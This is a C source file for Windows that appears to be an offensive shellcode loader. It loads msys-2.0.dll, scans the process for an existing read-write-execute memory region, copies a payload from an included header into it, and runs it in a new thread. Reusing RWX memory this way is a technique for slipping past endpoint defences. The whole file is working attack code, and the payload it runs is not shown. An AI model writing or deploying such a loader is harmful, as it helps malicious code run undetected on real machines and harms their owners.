#include <windows.h>
#include <stdio.h>
#include "Payload.h"

PVOID RWXFinder( HANDLE hProcess, SIZE_T min_size ) {

    MEMORY_BASIC_INFORMATION mbi;
    PBYTE pAddress = NULL;

    while ( VirtualQueryEx( hProcess, pAddress, &mbi, sizeof( mbi ) ) == sizeof( mbi ) ) {
        if ( mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.RegionSize >= min_size ) {
            // printf( "[+] Found RWX memory region at: %p\n", mbi.BaseAddress );
            return mbi.BaseAddress;
        }
        pAddress += mbi.RegionSize;
    }

    return NULL;
}


int main( void ) {

    HMODULE hModule = LoadLibraryA( "msys-2.0.dll" );

    printf( "Loaded msys-2.0.dll at address: %p\n", hModule );


    PVOID pRWX = RWXFinder( GetCurrentProcess(), payloadSize );

    if ( pRWX == NULL ) {
        printf( "[-] Failed to find RWX memory region\n" );
        return 1;
    }

    printf( "[+] Found RWX memory region at: %p\n", pRWX );

    system( "pause" );

    SIZE_T bytesWritten;
    if ( !WriteProcessMemory( GetCurrentProcess(), pRWX, payload, payloadSize, &bytesWritten ) ) {
        printf( "[-] Failed to write payload to RWX memory region\n" );
        return 1;
    }

    printf( "[+] Wrote %lu bytes at %p\n", ( unsigned long )bytesWritten, pRWX );

    system( "pause" );

    HANDLE hThread = CreateThread( NULL, 0, ( LPTHREAD_START_ROUTINE )pRWX, NULL, 0, NULL );
    if ( hThread == NULL ) {
        printf( "[-] Failed to create thread\n" );
        return 1;
    }

    WaitForSingleObject( hThread, INFINITE );

    return 0;
}
